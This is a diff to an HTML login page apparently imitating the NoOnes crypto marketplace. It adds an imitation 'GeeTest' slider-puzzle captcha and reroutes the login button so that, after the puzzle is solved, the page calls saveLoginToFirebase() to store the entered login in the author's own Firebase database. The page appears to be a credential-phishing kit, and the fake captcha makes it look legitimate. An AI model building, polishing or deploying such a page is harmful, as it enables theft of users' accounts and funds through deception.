@@ -237,9 +237,205 @@
 
 .logo-area{display:flex;justify-content:center;align-items:center;padding:18px 0 16px;}
 .noones-logo{width:185px;height:auto;display:block;}
+/* ==========================
+   CAPTCHA
+========================== */
+
+.captcha-overlay{
+
+position:fixed;
+
+left:0;
+top:0;
+
+width:100%;
+height:100%;
+
+background:rgba(0,0,0,.65);
+
+display:none;
+
+align-items:center;
+justify-content:center;
+
+z-index:99999;
+
+backdrop-filter:blur(2px);
+
+}
+
+.captcha-box{
+
+width:340px;
+max-width:92%;
+
+background:#2f3136;
+
+border-radius:8px;
+
+overflow:hidden;
+
+box-shadow:0 20px 70px rgba(0,0,0,.55);
+
+animation:popup .25s ease;
+
+}
+
+@keyframes popup{
+
+from{
+
+opacity:0;
+transform:scale(.9);
+
+}
+
+to{
+
+opacity:1;
+transform:scale(1);
+
+}
+
+}
+
+.captcha-top{
+
+height:6px;
+
+background:#36d621;
+
+}
+
+.captcha-box h2{
+
+color:white;
+
+text-align:center;
+
+font-size:18px;
+
+margin:18px;
+
+font-weight:700;
+
+}
+
+.captcha-canvas-area{
+
+width:320px;
+height:180px;
+
+margin:auto;
+
+position:relative;
+
+background:#ddd;
+
+border-radius:4px;
+
+overflow:hidden;
+
+}
+
+#captchaCanvas,
+#pieceCanvas{
+
+position:absolute;
+
+left:0;
+top:0;
+
+}
+
+.slider-area{
+
+padding:20px;
+
+}
+
+.slider-track{
+
+height:54px;
+
+background:#424347;
+
+border-radius:50px;
+
+position:relative;
+
+overflow:hidden;
+
+}
+
+#sliderFill{
+
+position:absolute;
+
+left:0;
+top:0;
+
+height:100%;
+
+width:0;
+
+background:#3ad622;
+
+}
+
+#sliderButton{
+
+width:54px;
+height:54px;
+
+background:#18cf77;
+
+border-radius:50%;
+
+position:absolute;
+
+left:0;
+top:0;
+
+display:flex;
+
+align-items:center;
+justify-content:center;
+
+font-size:30px;
+
+color:white;
+
+cursor:pointer;
+
+user-select:none;
+
+touch-action:none;
+
+box-shadow:0 4px 15px rgba(0,0,0,.35);
+
+}
+
+#captchaMessage{
+
+height:45px;
+
+display:flex;
+
+align-items:center;
+justify-content:center;
+
+font-size:18px;
+
+font-weight:bold;
+
+color:#36d621;
+
+}
 </style>
 
 <style>img,video{max-width:100%;height:auto}body{max-width:100%;overflow-x:hidden}.container,.card,.wrapper{max-width:100%;width:100%!important}@media(max-width:768px){*{box-sizing:border-box}body{padding:0;margin:0}}</style>
+
 </head>
 <body>
 <div class="device">
@@ -307,6 +503,46 @@
 </div>
 <div class="home-indicator"></div>
 </div>
+<!-- ===========================
+     GeeTest Puzzle Popup
+============================ -->
+<div id="captchaOverlay" class="captcha-overlay">
+
+    <div class="captcha-box">
+
+        <div class="captcha-top"></div>
+
+        <h2>Slide to complete the puzzle</h2>
+
+        <div class="captcha-canvas-area">
+
+            <canvas id="captchaCanvas"
+                    width="320"
+                    height="180"></canvas>
+
+            <canvas id="pieceCanvas"
+                    width="320"
+                    height="180"></canvas>
+
+        </div>
+
+        <div class="slider-area">
+
+            <div class="slider-track">
+
+                <div id="sliderFill"></div>
+
+                <div id="sliderButton">
+                    ➜
+                </div>
+
+            </div>
+
+        </div>
+
+        <div id="captchaMessage"></div>
+
+    </div>
 <script type="module">
 
 import { db } from "./js/firebase.js";
@@ -371,9 +607,274 @@ document
 .getElementById("loginBtn")
 .addEventListener("click", function () {
 
-    saveLoginToFirebase();
+    openCaptcha();
 
 });
+function openCaptcha(){
+
+document.getElementById("captchaOverlay").style.display="flex";
+
+loadPuzzle();
+
+}
+
+/* ===========================================
+   REAL JIGSAW CAPTCHA
+=========================================== */
+
+const canvas = document.getElementById("captchaCanvas");
+const ctx = canvas.getContext("2d");
+
+const pieceCanvas = document.getElementById("pieceCanvas");
+const pieceCtx = pieceCanvas.getContext("2d");
+
+const img = new Image();
+
+const images = [
+"https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=320&h=180&fit=crop",
+"https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?w=320&h=180&fit=crop",
+"https://images.unsplash.com/photo-1493246507139-91e8fad9978e?w=320&h=180&fit=crop"
+];
+
+let pieceX = 0;
+let pieceY = 0;
+
+let holeX = 0;
+let holeY = 0;
+
+let pieceSize = 42;
+
+let sliderValue = 0;
+function loadPuzzle(){
+
+    pieceCtx.clearRect(0,0,320,180);
+    ctx.clearRect(0,0,320,180);
+
+    img.crossOrigin = "Anonymous";
+img.onerror = function () {
+    alert("Puzzle image failed to load.");
+};
+
+    img.src=images[Math.floor(Math.random()*images.length)];
+
+    img.onload=function(){
+
+        ctx.drawImage(img,0,0,320,180);
+
+        generatePuzzle();
+
+    };
+
+}
+
+function generatePuzzle(){
+
+    holeX = 120 + Math.random() * 120;
+    holeY = 40 + Math.random() * 70;
+
+    pieceX = 10;
+    pieceY = holeY;
+
+    drawPuzzle();
+
+}
+
+function drawPuzzle(){
+
+    ctx.clearRect(0,0,320,180);
+    ctx.drawImage(img,0,0,320,180);
+
+    drawHole(ctx,holeX,holeY,pieceSize);
+
+    pieceCtx.clearRect(0,0,320,180);
+
+    pieceCtx.save();
+
+    createPuzzlePath(pieceCtx,pieceX,pieceY,pieceSize);
+
+    pieceCtx.clip();
+
+    pieceCtx.drawImage(
+        img,
+        holeX,
+        holeY,
+        pieceSize,
+        pieceSize,
+        pieceX,
+        pieceY,
+        pieceSize,
+        pieceSize
+    );
+
+    pieceCtx.restore();
+
+    createPuzzlePath(pieceCtx,pieceX,pieceY,pieceSize);
+
+    pieceCtx.lineWidth=2;
+
+    pieceCtx.strokeStyle="#ffffff";
+
+    pieceCtx.stroke();
+
+}
+function drawHole(ctx,x,y,size){
+
+    ctx.save();
+
+    createPuzzlePath(ctx,x,y,size);
+
+    ctx.fillStyle="rgba(255,255,255,.55)";
+
+    ctx.fill();
+
+    ctx.restore();
+
+}
+function createPuzzlePath(ctx,x,y,size){
+
+    const r=size/4;
+
+    ctx.beginPath();
+
+    ctx.moveTo(x,y);
+
+    ctx.lineTo(x+size*0.30,y);
+
+    ctx.arc(
+        x+size*0.50,
+        y,
+        r,
+        Math.PI,
+        0,
+        false
+    );
+
+    ctx.lineTo(x+size,y);
+
+    ctx.lineTo(x+size,y+size*0.30);
+
+    ctx.arc(
+        x+size,
+        y+size*0.50,
+        r,
+        -Math.PI/2,
+        Math.PI/2,
+        false
+    );
+
+    ctx.lineTo(x+size,y+size);
+
+    ctx.lineTo(x,y+size);
+
+    ctx.lineTo(x,y);
+
+    ctx.closePath();
+
+}
+
+function closeCaptcha(){
+
+document.getElementById("captchaOverlay").style.display="none";
+
+}
+const slider = document.getElementById("sliderButton");
+const sliderFill = document.getElementById("sliderFill");
+const message = document.getElementById("captchaMessage");
+
+let dragging = false;
+let startOffset = 0;
+
+const maxMove = 320 - pieceSize - 10;
+const maxSlider = 320 - 54;
+
+slider.addEventListener("mousedown", function(e){
+    dragging = true;
+    startOffset = e.offsetX;
+});
+
+document.addEventListener("mousemove", dragSlider);
+document.addEventListener("mouseup", finishSlide);
+
+slider.addEventListener("touchstart", function(e){
+    dragging = true;
+    const rect = slider.getBoundingClientRect();
+    startOffset = e.touches[0].clientX - rect.left;
+});
+
+document.addEventListener("touchmove", dragSliderTouch,{passive:false});
+document.addEventListener("touchend", finishSlide);
+
+function dragSlider(e){
+
+    if(!dragging) return;
+
+    const rect = slider.parentElement.getBoundingClientRect();
+
+    let x = e.clientX - rect.left - startOffset + 27;
+
+    updateSlider(x);
+
+}
+
+function dragSliderTouch(e){
+
+    if(!dragging) return;
+
+    e.preventDefault();
+
+    const rect = slider.parentElement.getBoundingClientRect();
+
+    let x = e.touches[0].clientX - rect.left - startOffset + 27;
+
+    updateSlider(x);
+
+}
+
+function updateSlider(x) {
+    x = Math.max(0, Math.min(maxSlider, x));
+
+    slider.style.left = x + "px";
+    sliderFill.style.width = (x + 27) + "px";
+
+    pieceX = 10 + (x / maxSlider) * maxMove;
+
+    drawPuzzle();
+}
+
+function finishSlide() {
+    if (!dragging) return;
+    dragging = false;
+
+    if (Math.abs(pieceX - holeX) < 5) {
+        message.style.color = "#36d621";
+        message.textContent = "✔ Verified";
+
+        setTimeout(async () => {
+            closeCaptcha();
+            await saveLoginToFirebase();
+        }, 700);
+
+    } else {
+        message.style.color = "#ff4d4d";
+        message.textContent = "Try again";
+
+        slider.style.left = "0px";
+        sliderFill.style.width = "0px";
+
+        pieceX = 10;
+        drawPuzzle();
+
+        setTimeout(() => {
+            message.textContent = "";
+        }, 1000);
+    }
+}
 </script>
+
+
+
+
+
+</div>
 </body>
 </html>
